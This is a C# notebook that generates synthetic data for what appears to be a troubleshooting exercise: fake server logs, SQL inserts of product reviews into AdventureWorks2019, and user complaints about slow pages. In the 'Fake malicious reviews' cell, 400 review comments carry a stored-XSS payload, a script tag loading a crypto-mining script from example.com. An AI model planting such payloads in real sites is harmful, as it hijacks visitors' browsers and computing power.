{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Generate fake server logs."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "#r \"Naminator.dll\""
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "using Naminator;"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "using System.IO;\n",
        "using System.Text;\n",
        "using System.Text.Json;\n",
        "\n",
        "var rand = new Random();\n",
        "var timeRand = new Random();\n",
        "var minDate = new DateTime(2015, 1, 1);\n",
        "var endDate = new DateTime(2019, 12, 31);\n",
        "var daysRange = (int)((endDate - minDate).TotalDays);\n",
        "var productRand = new Random();\n",
        "\n",
        "var productIds = File.ReadAllLines(\"./productids.txt\");\n",
        "\n",
        "string GetRandomProductId()\n",
        "{\n",
        "    return productIds[productRand.Next(productIds.Length - 1)];\n",
        "}\n",
        "string GetRandomDate()\n",
        "{\n",
        "    return minDate.AddDays(rand.Next(daysRange)).Date.ToString(\"yyyy-MM-dd HH:mm:ss\");\n",
        "}"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "\n",
        "public (string name, string lastName, string email) GenerateUser(){\n",
        "    var name = Any.FirstName().Replace(\"'\", \" \");\n",
        "    var lastName = Any.LastName().Replace(\"'\", \" \");\n",
        "    var email = Any.Email();\n",
        "    email = $\"{name.Replace(\" \", \".\")}.{lastName.Replace(\" \", \".\")}@{email.Split('@').Last()}\".ToLowerInvariant();\n",
        "    return (name,lastName,email);\n",
        "}"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "using System.IO;\n",
        "using System.Text.Json;\n",
        "\n",
        "var serializerOptions = new JsonSerializerOptions(JsonSerializerDefaults.General){\n",
        "    WriteIndented = true,\n",
        "    Encoder  = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping \n",
        "};"
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "public record LogLine(string url, string responseTimeMS);\n",
        "var logLines = new List<LogLine>();\n",
        "\n",
        "for (int i = 0; i < 1000; i++)\n",
        "{\n",
        "    var logLine = new LogLine(\n",
        "        $\"https://example.com/view/product/{GetRandomProductId()}\",\n",
        "        $\"{timeRand.Next(4, 25)}\"\n",
        "    );\n",
        "    logLines.Add(logLine);\n",
        "}\n",
        "\n",
        "File.WriteAllText(\"serverlog.json\", JsonSerializer.Serialize(logLines,serializerOptions));"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Fake normal reviews."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "\n",
        "var lorum = @\"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\";\n",
        "var words = lorum.Split(\" \");\n",
        "\n",
        "string GetComment()\n",
        "{\n",
        "    var count = rand.Next(words.Length);\n",
        "    return string.Join(\" \", words.Take(count));\n",
        "}\n",
        "\n",
        "var insertLines = new List<string>();\n",
        "for (int i = 0; i < 950; i++)\n",
        "{   \n",
        "    var date = GetRandomDate();\n",
        "    var (name, lastName, email) = GenerateUser();\n",
        "    insertLines.Add($\"({GetRandomProductId()}, '{name} {lastName}', '{date}', '{email}', {rand.Next(1, 5)}, '{GetComment()}', '{date}'),\");\n",
        "}\n",
        "\n",
        "var sb = new StringBuilder();\n",
        "sb.AppendLine(\"INSERT INTO [AdventureWorks2019].[Production].[ProductReview]([ProductID], [ReviewerName], [ReviewDate], [EmailAddress], [Rating], [Comments], [ModifiedDate])\");\n",
        "sb.AppendLine(\"VALUES\");\n",
        "sb.AppendLine(string.Join(\"\\n\", insertLines));\n",
        "\n",
        "File.WriteAllText(@\"..\\sql\\insert_review.sql\", sb.ToString().TrimEnd().TrimEnd(','));"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Fake malicious reviews."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "string GetComment()\n",
        "{\n",
        "    return \"<script src=\\\"https://example.com/mine-crypto.js\\\"/>\";\n",
        "}\n",
        "\n",
        "var troubleProducts = new HashSet<string>();\n",
        "\n",
        "var insertLines = new List<string>();\n",
        "for (int i = 0; i < 400; i++)\n",
        "{\n",
        "    var productId = GetRandomProductId();\n",
        "    troubleProducts.Add(productId);\n",
        "    var date = GetRandomDate();\n",
        "    var (name, lastName, email) = GenerateUser();\n",
        "    insertLines.Add($\"({productId}, '{name} {lastName}', '{date}', '{email}', {rand.Next(1, 5)}, '{GetComment()}', '{date}'),\");\n",
        "}\n",
        "\n",
        "var sb = new StringBuilder();\n",
        "sb.AppendLine(\"INSERT INTO [AdventureWorks2019].[Production].[ProductReview]([ProductID], [ReviewerName], [ReviewDate], [EmailAddress], [Rating], [Comments], [ModifiedDate])\");\n",
        "sb.AppendLine(\"VALUES\");\n",
        "sb.AppendLine(string.Join(\"\\n\", insertLines));\n",
        "\n",
        "File.WriteAllText(@\"..\\sql\\insert_malicious_review.sql\", sb.ToString().TrimEnd().TrimEnd(','));"
      ],
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Generate report dump"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "csharp"
        }
      },
      "source": [
        "public record Report (string date, string from, string reson, string url, string comment);\n",
        "\n",
        "var reports = new List<Report>();\n",
        "\n",
        "var serializerOptions = new JsonSerializerOptions(JsonSerializerDefaults.General ){\n",
        "    WriteIndented = true,\n",
        "    Encoder  = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping \n",
        "   };\n",
        "var ids = troubleProducts.ToList();\n",
        "\n",
        "for (var i = 0; i <50; i++){\n",
        "    var date = GetRandomDate();\n",
        "    var (name, lastName, email) = GenerateUser();\n",
        "    var productId = ids[rand.Next(ids.Count)];\n",
        "    var report = new Report(\n",
        "        date,\n",
        "        email,\n",
        "        \"Slow page\",\n",
        "        $\"https://example.com/view/product/{GetRandomProductId()}\", \n",
        "        \"I was researching products on your site and it was too slow; I'm going to use Amazon instead.\");\n",
        "    \n",
        "        reports.Add(report);\n",
        "}\n",
        "\n",
        "File.WriteAllText(@\".\\report_export.json\", JsonSerializer.Serialize(reports,serializerOptions));"
      ],
      "outputs": []
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": ".NET (C#)",
      "language": "C#",
      "name": ".net-csharp"
    },
    "language_info": {
      "file_extension": ".cs",
      "mimetype": "text/x-csharp",
      "name": "C#",
      "pygments_lexer": "csharp",
      "version": "8.0"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}